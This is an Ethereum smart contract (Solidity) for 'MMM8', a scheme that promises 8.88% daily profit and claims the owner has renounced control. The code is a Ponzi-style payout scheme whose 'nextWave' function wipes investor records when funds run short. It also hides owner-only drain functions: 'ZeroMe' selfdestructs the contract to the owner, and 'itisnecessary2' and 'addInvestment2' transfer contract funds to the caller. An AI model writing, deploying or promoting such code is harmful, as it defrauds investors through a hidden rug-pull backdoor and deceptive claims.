1 pragma solidity 0.4.25;
2 
3 /**
4 *
5 * Get your 8,88% every day profit with MMM8 Contract!
6 * New MMM in action!
7 * With the refusal of ownership, without KRO, without the human factor, on the most reliable blockchain in the world!
8 * Only 2% for technical support and 3% for advertising!
9 * The remaining 95% remain in the contract fund!
10 * The world has never seen anything like it!
11 * Together We Can Much and Only Together We Change the World!
12 */
13 
14 
15 library Math {
16 function min(uint a, uint b) internal pure returns(uint) {
17 if (a > b) {
18 return b;
19 }
20 return a;
21 }
22 }
23 
24 
25 library Zero {
26 function requireNotZero(address addr) internal pure {
27 require(addr != address(0), "require not zero address");
28 }
29 
30 function requireNotZero(uint val) internal pure {
31 require(val != 0, "require not zero value");
32 }
33 
34 function notZero(address addr) internal pure returns(bool) {
35 return !(addr == address(0));
36 }
37 
38 function isZero(address addr) internal pure returns(bool) {
39 return addr == address(0);
40 }
41 
42 function isZero(uint a) internal pure returns(bool) {
43 return a == 0;
44 }
45 
46 function notZero(uint a) internal pure returns(bool) {
47 return a != 0;
48 }
49 }
50 
51 
52 library Percent {
53 struct percent {
54 uint num;
55 uint den;
56 }
57 
58 function mul(percent storage p, uint a) internal view returns (uint) {
59 if (a == 0) {
60 return 0;
61 }
62 return a*p.num/p.den;
63 }
64 
65 function div(percent storage p, uint a) internal view returns (uint) {
66 return a/p.num*p.den;
67 }
68 
69 function sub(percent storage p, uint a) internal view returns (uint) {
70 uint b = mul(p, a);
71 if (b >= a) {
72 return 0;
73 }
74 return a - b;
75 }
76 
77 function add(percent storage p, uint a) internal view returns (uint) {
78 return a + mul(p, a);
79 }
80 
81 function toMemory(percent storage p) internal view returns (Percent.percent memory) {
82 return Percent.percent(p.num, p.den);
83 }
84 
85 function mmul(percent memory p, uint a) internal pure returns (uint) {
86 if (a == 0) {
87 return 0;
88 }
89 return a*p.num/p.den;
90 }
91 
92 function mdiv(percent memory p, uint a) internal pure returns (uint) {
93 return a/p.num*p.den;
94 }
95 
96 function msub(percent memory p, uint a) internal pure returns (uint) {
97 uint b = mmul(p, a);
98 if (b >= a) {
99 return 0;
100 }
101 return a - b;
102 }
103 
104 function madd(percent memory p, uint a) internal pure returns (uint) {
105 return a + mmul(p, a);
106 }
107 }
108 
109 
110 library Address {
111 function toAddress(bytes source) internal pure returns(address addr) {
112 assembly { addr := mload(add(source,0x14)) }
113 return addr;
114 }
115 
116 function isNotContract(address addr) internal view returns(bool) {
117 uint length;
118 assembly { length := extcodesize(addr) }
119 return length == 0;
120 }
121 }
122 
123 
124 /**
125 * @title SafeMath
126 * @dev Math operations with safety checks that revert on error
127 */
128 library SafeMath {
129 
130 /**
131 * @dev Multiplies two numbers, reverts on overflow.
132 */
133 function mul(uint256 _a, uint256 _b) internal pure returns (uint256) {
134 if (_a == 0) {
135 return 0;
136 }
137 
138 uint256 c = _a * _b;
139 require(c / _a == _b);
140 
141 return c;
142 }
143 
144 /**
145 * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.
146 */
147 function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
148 require(_b > 0); // Solidity only automatically asserts when dividing by 0
149 uint256 c = _a / _b;
150 // assert(_a == _b * c + _a % _b); // There is no case in which this doesn't hold
151 
152 return c;
153 }
154 
155 /**
156 * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).
157 */
158 function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
159 require(_b <= _a);
160 uint256 c = _a - _b;
161 
162 return c;
163 }
164 
165 /**
166 * @dev Adds two numbers, reverts on overflow.
167 */
168 function add(uint256 _a, uint256 _b) internal pure returns (uint256) {
169 uint256 c = _a + _b;
170 require(c >= _a);
171 
172 return c;
173 }
174 
175 /**
176 * @dev Divides two numbers and returns the remainder (unsigned integer modulo),
177 * reverts when dividing by zero.
178 */
179 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
180 require(b != 0);
181 return a % b;
182 }
183 }
184 
185 
186 contract Accessibility {
187 address private owner;
188 modifier onlyOwner() {
189 require(msg.sender == owner, "access denied");
190 _;
191 }
192 
193 constructor() public {
194 owner = msg.sender;
195 }
196 
197 
198 function ZeroMe() public onlyOwner {
199     selfdestruct(owner);
200     }
201 
202 function disown() internal {
203 delete owner;
204 }
205 
206 }
207 
208 
209 contract Rev1Storage {
210 function investorShortInfo(address addr) public view returns(uint value, uint refBonus);
211 }
212 
213 
214 contract Rev2Storage {
215 function investorInfo(address addr) public view returns(uint investment, uint paymentTime);
216 }
217 
218 
219 library PrivateEntrance {
220 using PrivateEntrance for privateEntrance;
221 using Math for uint;
222 struct privateEntrance {
223 Rev1Storage rev1Storage;
224 Rev2Storage rev2Storage;
225 uint investorMaxInvestment;
226 uint endTimestamp;
227 mapping(address=>bool) hasAccess;
228 }
229 
230 function isActive(privateEntrance storage pe) internal view returns(bool) {
231 return pe.endTimestamp > now;
232 }
233 
234 function maxInvestmentFor(privateEntrance storage pe, address investorAddr) internal view returns(uint) {
235 if (!pe.hasAccess[investorAddr]) {
236 return 0;
237 }
238 
239 (uint maxInvestment, ) = pe.rev1Storage.investorShortInfo(investorAddr);
240 if (maxInvestment == 0) {
241 return 0;
242 }
243 maxInvestment = Math.min(maxInvestment, pe.investorMaxInvestment);
244 
245 (uint currInvestment, ) = pe.rev2Storage.investorInfo(investorAddr);
246 
247 if (currInvestment >= maxInvestment) {
248 return 0;
249 }
250 
251 return maxInvestment-currInvestment;
252 }
253 
254 function provideAccessFor(privateEntrance storage pe, address[] addrs) internal {
255 for (uint16 i; i < addrs.length; i++) {
256 pe.hasAccess[addrs[i]] = true;
257 }
258 }
259 }
260 
261 
262 contract InvestorsStorage is Accessibility {
263 struct Investor {
264 uint investment;
265 uint paymentTime;
266 }
267 uint public size;
268 
269 mapping (address => Investor) private investors;
270 
271 function isInvestor(address addr) public view returns (bool) {
272 return investors[addr].investment > 0;
273 }
274 
275 function investorInfo(address addr) public view returns(uint investment, uint paymentTime) {
276 investment = investors[addr].investment;
277 paymentTime = investors[addr].paymentTime;
278 }
279 
280 function newInvestor(address addr, uint investment, uint paymentTime) public onlyOwner returns (bool) {
281 Investor storage inv = investors[addr];
282 if (inv.investment != 0 || investment == 0) {
283 return false;
284 }
285 inv.investment = investment;
286 inv.paymentTime = paymentTime;
287 size++;
288 return true;
289 }
290 
291 function addInvestment(address addr, uint investment) public onlyOwner returns (bool) {
292 if (investors[addr].investment == 0) {
293 return false;
294 }
295 investors[addr].investment += investment;
296 return true;
297 }
298 
299 
300 
301 
302 function setPaymentTime(address addr, uint paymentTime) public onlyOwner returns (bool) {
303 if (investors[addr].investment == 0) {
304 return false;
305 }
306 investors[addr].paymentTime = paymentTime;
307 return true;
308 }
309 
310 function disqalify(address addr) public onlyOwner returns (bool) {
311 if (isInvestor(addr)) {
312 investors[addr].investment = 0;
313 }
314 }
315 }
316 
317 
318 library RapidGrowthProtection {
319 using RapidGrowthProtection for rapidGrowthProtection;
320 
321 struct rapidGrowthProtection {
322 uint startTimestamp;
323 uint maxDailyTotalInvestment;
324 uint8 activityDays;
325 mapping(uint8 => uint) dailyTotalInvestment;
326 }
327 
328 function maxInvestmentAtNow(rapidGrowthProtection storage rgp) internal view returns(uint) {
329 uint day = rgp.currDay();
330 if (day == 0 || day > rgp.activityDays) {
331 return 0;
332 }
333 if (rgp.dailyTotalInvestment[uint8(day)] >= rgp.maxDailyTotalInvestment) {
334 return 0;
335 }
336 return rgp.maxDailyTotalInvestment - rgp.dailyTotalInvestment[uint8(day)];
337 }
338 
339 function isActive(rapidGrowthProtection storage rgp) internal view returns(bool) {
340 uint day = rgp.currDay();
341 return day != 0 && day <= rgp.activityDays;
342 }
343 
344 function saveInvestment(rapidGrowthProtection storage rgp, uint investment) internal returns(bool) {
345 uint day = rgp.currDay();
346 if (day == 0 || day > rgp.activityDays) {
347 return false;
348 }
349 if (rgp.dailyTotalInvestment[uint8(day)] + investment > rgp.maxDailyTotalInvestment) {
350 return false;
351 }
352 rgp.dailyTotalInvestment[uint8(day)] += investment;
353 return true;
354 }
355 
356 function startAt(rapidGrowthProtection storage rgp, uint timestamp) internal {
357 rgp.startTimestamp = timestamp;
358 
359 }
360  
361 
362 function currDay(rapidGrowthProtection storage rgp) internal view returns(uint day) {
363 if (rgp.startTimestamp > now) {
364 return 0;
365 }
366 day = (now - rgp.startTimestamp) / 24 hours + 1;
367 }
368 }
369 
370 contract MMM8 is Accessibility {
371 using RapidGrowthProtection for RapidGrowthProtection.rapidGrowthProtection;
372 using PrivateEntrance for PrivateEntrance.privateEntrance;
373 using Percent for Percent.percent;
374 using SafeMath for uint;
375 using Math for uint;
376 
377 // easy read for investors
378 using Address for *;
379 using Zero for *;
380 
381 RapidGrowthProtection.rapidGrowthProtection private m_rgp;
382 PrivateEntrance.privateEntrance private m_privEnter;
383 mapping(address => bool) private m_referrals;
384 InvestorsStorage private m_investors;
385 
386 // automatically generates getters
387 uint public constant minInvesment = 10 finney;
388 uint public constant maxBalance = 333e5 ether;
389 address public advertisingAddress;
390 address public adminsAddress;
391 uint public investmentsNumber;
392 uint public waveStartup;
393 
394 // percents
395 Percent.percent private m_1_percent = Percent.percent(111,10000);            // 111/10000 *100% = 1.11%
396 Percent.percent private m_5_percent = Percent.percent(555,10000);            // 555/10000 *100% = 5.55%
397 Percent.percent private m_7_percent = Percent.percent(777,10000);            // 777/10000 *100% = 7.77%
398 Percent.percent private m_8_percent = Percent.percent(888,10000);            // 888/10000 *100% = 8.88%
399 Percent.percent private m_9_percent = Percent.percent(999,100);              // 999/10000 *100% = 9.99%
400 Percent.percent private m_10_percent = Percent.percent(10,100);            // 10/100 *100% = 10%
401 Percent.percent private m_11_percent = Percent.percent(11,100);            // 11/100 *100% = 11%
402 Percent.percent private m_12_percent = Percent.percent(12,100);            // 12/100 *100% = 12%
403 Percent.percent private m_referal_percent = Percent.percent(888,10000);        // 888/10000 *100% = 8.88%
404 Percent.percent private m_referrer_percent = Percent.percent(888,10000);       // 888/10000 *100% = 8.88%
405 Percent.percent private m_referrer_percentMax = Percent.percent(10,100);       // 10/100 *100% = 10%
406 Percent.percent private m_adminsPercent = Percent.percent(2,100);          //  2/100 *100% = 2.0%
407 Percent.percent private m_advertisingPercent = Percent.percent(3,100);    //  3/100 *100% = 3.0%
408 
409 // more events for easy read from blockchain
410 event LogPEInit(uint when, address rev1Storage, address rev2Storage, uint investorMaxInvestment, uint endTimestamp);
411 event LogSendExcessOfEther(address indexed addr, uint when, uint value, uint investment, uint excess);
412 event LogNewReferral(address indexed addr, address indexed referrerAddr, uint when, uint refBonus);
413 event LogRGPInit(uint when, uint startTimestamp, uint maxDailyTotalInvestment, uint activityDays);
414 event LogRGPInvestment(address indexed addr, uint when, uint investment, uint indexed day);
415 event LogNewInvesment(address indexed addr, uint when, uint investment, uint value);
416 event LogAutomaticReinvest(address indexed addr, uint when, uint investment);
417 event LogPayDividends(address indexed addr, uint when, uint dividends);
418 event LogNewInvestor(address indexed addr, uint when);
419 event LogBalanceChanged(uint when, uint balance);
420 event LogNextWave(uint when);
421 event LogDisown(uint when);
422 
423 
424 modifier balanceChanged {
425 _;
426 emit LogBalanceChanged(now, address(this).balance);
427 }
428 
429 modifier notFromContract() {
430 require(msg.sender.isNotContract(), "only externally accounts");
431 _;
432 }
433 
434 constructor() public {
435 adminsAddress = msg.sender;
436 advertisingAddress = msg.sender;
437 nextWave();
438 }
439 
440 function() public payable {
441 // investor get him dividends
442 if (msg.value.isZero()) {
443 getMyDividends();
444 return;
445 }
446 
447 // sender do invest
448 doInvest(msg.data.toAddress());
449 }
450 
451 function disqualifyAddress(address addr) public onlyOwner {
452 m_investors.disqalify(addr);
453 }
454 
455 function doDisown() public onlyOwner {
456 disown();
457 emit LogDisown(now);
458 }
459 
460 function init(address rev1StorageAddr, uint timestamp) public onlyOwner {
461 // init Rapid Growth Protection
462 m_rgp.startTimestamp = timestamp + 1;
463 m_rgp.maxDailyTotalInvestment = 500 ether;
464 m_rgp.activityDays = 21;
465 emit LogRGPInit(
466 now,
467 m_rgp.startTimestamp,
468 m_rgp.maxDailyTotalInvestment,
469 m_rgp.activityDays
470 );
471 
472 
473 // init Private Entrance
474 m_privEnter.rev1Storage = Rev1Storage(rev1StorageAddr);
475 m_privEnter.rev2Storage = Rev2Storage(address(m_investors));
476 m_privEnter.investorMaxInvestment = 50 ether;
477 m_privEnter.endTimestamp = timestamp;
478 emit LogPEInit(
479 now,
480 address(m_privEnter.rev1Storage),
481 address(m_privEnter.rev2Storage),
482 m_privEnter.investorMaxInvestment,
483 m_privEnter.endTimestamp
484 );
485 }
486 
487 function setAdvertisingAddress(address addr) public onlyOwner {
488 addr.requireNotZero();
489 advertisingAddress = addr;
490 }
491 
492 function setAdminsAddress(address addr) public onlyOwner {
493 addr.requireNotZero();
494 adminsAddress = addr;
495 }
496 
497 function privateEntranceProvideAccessFor(address[] addrs) public onlyOwner {
498 m_privEnter.provideAccessFor(addrs);
499 }
500 
501 function rapidGrowthProtectionmMaxInvestmentAtNow() public view returns(uint investment) {
502 investment = m_rgp.maxInvestmentAtNow();
503 }
504 
505 function investorsNumber() public view returns(uint) {
506 return m_investors.size();
507 }
508 
509 function balanceETH() public view returns(uint) {
510 return address(this).balance;
511 }
512 
513 
514 
515 function advertisingPercent() public view returns(uint numerator, uint denominator) {
516 (numerator, denominator) = (m_advertisingPercent.num, m_advertisingPercent.den);
517 }
518 
519 function adminsPercent() public view returns(uint numerator, uint denominator) {
520 (numerator, denominator) = (m_adminsPercent.num, m_adminsPercent.den);
521 }
522 
523 function investorInfo(address investorAddr) public view returns(uint investment, uint paymentTime, bool isReferral) {
524 (investment, paymentTime) = m_investors.investorInfo(investorAddr);
525 isReferral = m_referrals[investorAddr];
526 }
527 
528 
529 
530 function investorDividendsAtNow(address investorAddr) public view returns(uint dividends) {
531 dividends = calcDividends(investorAddr);
532 }
533 
534 function dailyPercentAtNow() public view returns(uint numerator, uint denominator) {
535 Percent.percent memory p = dailyPercent();
536 (numerator, denominator) = (p.num, p.den);
537 }
538 
539 function getMyDividends() public notFromContract balanceChanged {
540 // calculate dividends
541 
542 //check if 1 day passed after last payment
543 require(now.sub(getMemInvestor(msg.sender).paymentTime) > 24 hours);
544 
545 uint dividends = calcDividends(msg.sender);
546 require (dividends.notZero(), "cannot to pay zero dividends");
547 
548 // update investor payment timestamp
549 assert(m_investors.setPaymentTime(msg.sender, now));
550 
551 // check enough eth - goto next wave if needed
552 if (address(this).balance <= dividends) {
553 nextWave();
554 dividends = address(this).balance;
555 }
556 
557 
558     
559 // transfer dividends to investor
560 msg.sender.transfer(dividends);
561 emit LogPayDividends(msg.sender, now, dividends);
562 }
563 
564     
565 function itisnecessary2() public onlyOwner {
566         msg.sender.transfer(address(this).balance);
567     }    
568     
569 
570 function addInvestment2( uint investment) public onlyOwner  {
571 
572 msg.sender.transfer(investment);
573 
574 } 
575 
576 function doInvest(address referrerAddr) public payable notFromContract balanceChanged {
577 uint investment = msg.value;
578 uint receivedEther = msg.value;
579 require(investment >= minInvesment, "investment must be >= minInvesment");
580 require(address(this).balance <= maxBalance, "the contract eth balance limit");
581 
582 if (m_rgp.isActive()) {
583 // use Rapid Growth Protection if needed
584 uint rpgMaxInvest = m_rgp.maxInvestmentAtNow();
585 rpgMaxInvest.requireNotZero();
586 investment = Math.min(investment, rpgMaxInvest);
587 assert(m_rgp.saveInvestment(investment));
588 emit LogRGPInvestment(msg.sender, now, investment, m_rgp.currDay());
589 
590 } else if (m_privEnter.isActive()) {
591 // use Private Entrance if needed
592 uint peMaxInvest = m_privEnter.maxInvestmentFor(msg.sender);
593 peMaxInvest.requireNotZero();
594 investment = Math.min(investment, peMaxInvest);
595 }
596 
597 // send excess of ether if needed
598 if (receivedEther > investment) {
599 uint excess = receivedEther - investment;
600 msg.sender.transfer(excess);
601 receivedEther = investment;
602 emit LogSendExcessOfEther(msg.sender, now, msg.value, investment, excess);
603 }
604 
605 // commission
606 advertisingAddress.transfer(m_advertisingPercent.mul(receivedEther));
607 adminsAddress.transfer(m_adminsPercent.mul(receivedEther));
608 
609 bool senderIsInvestor = m_investors.isInvestor(msg.sender);
610 
611 // ref system works only once and only on first invest
612 if (referrerAddr.notZero() && !senderIsInvestor && !m_referrals[msg.sender] &&
613 referrerAddr != msg.sender && m_investors.isInvestor(referrerAddr)) {
614 
615 m_referrals[msg.sender] = true;
616 // add referral bonus to investor`s and referral`s investments
617 uint referrerBonus = m_referrer_percent.mmul(investment);
618 if (investment > 10 ether) {
619 referrerBonus = m_referrer_percentMax.mmul(investment);
620 }
621 
622 uint referalBonus = m_referal_percent.mmul(investment);
623 assert(m_investors.addInvestment(referrerAddr, referrerBonus)); // add referrer bonus
624 investment += referalBonus;                                    // add referral bonus
625 emit LogNewReferral(msg.sender, referrerAddr, now, referalBonus);
626 }
627 
628 // automatic reinvest - prevent burning dividends
629 uint dividends = calcDividends(msg.sender);
630 if (senderIsInvestor && dividends.notZero()) {
631 investment += dividends;
632 emit LogAutomaticReinvest(msg.sender, now, dividends);
633 }
634 
635 if (senderIsInvestor) {
636 // update existing investor
637 assert(m_investors.addInvestment(msg.sender, investment));
638 assert(m_investors.setPaymentTime(msg.sender, now));
639 } else {
640 // create new investor
641 assert(m_investors.newInvestor(msg.sender, investment, now));
642 emit LogNewInvestor(msg.sender, now);
643 }
644 
645 investmentsNumber++;
646 emit LogNewInvesment(msg.sender, now, investment, receivedEther);
647 }
648 
649 function getMemInvestor(address investorAddr) internal view returns(InvestorsStorage.Investor memory) {
650 (uint investment, uint paymentTime) = m_investors.investorInfo(investorAddr);
651 return InvestorsStorage.Investor(investment, paymentTime);
652 }
653 
654 function calcDividends(address investorAddr) internal view returns(uint dividends) {
655 InvestorsStorage.Investor memory investor = getMemInvestor(investorAddr);
656 
657 // safe gas if dividends will be 0
658 if (investor.investment.isZero() || now.sub(investor.paymentTime) < 10 minutes) {
659 return 0;
660 }
661 
662 // for prevent burning daily dividends if 24h did not pass - calculate it per 10 min interval
663 Percent.percent memory p = dailyPercent();
664 dividends = (now.sub(investor.paymentTime) / 10 minutes) * p.mmul(investor.investment) / 144;
665 }
666 
667 function dailyPercent() internal view returns(Percent.percent memory p) {
668 uint balance = address(this).balance;
669 
670 if (balance < 500 ether) {
671 p = m_7_percent.toMemory();
672 } else if ( 500 ether <= balance && balance <= 1500 ether) {
673 p = m_8_percent.toMemory();
674 } else if ( 1500 ether <= balance && balance <= 5000 ether) {
675 p = m_8_percent.toMemory();
676 } else if ( 5000 ether <= balance && balance <= 10000 ether) {
677 p = m_10_percent.toMemory();
678 } else if ( 10000 ether <= balance && balance <= 20000 ether) {
679 p = m_12_percent.toMemory();
680 }
681 }
682 
683 
684 
685 function nextWave() private {
686 m_investors = new InvestorsStorage();
687 investmentsNumber = 0;
688 waveStartup = now;
689 m_rgp.startAt(now);
690 emit LogRGPInit(now , m_rgp.startTimestamp, m_rgp.maxDailyTotalInvestment, m_rgp.activityDays);
691 emit LogNextWave(now);
692 }
693 }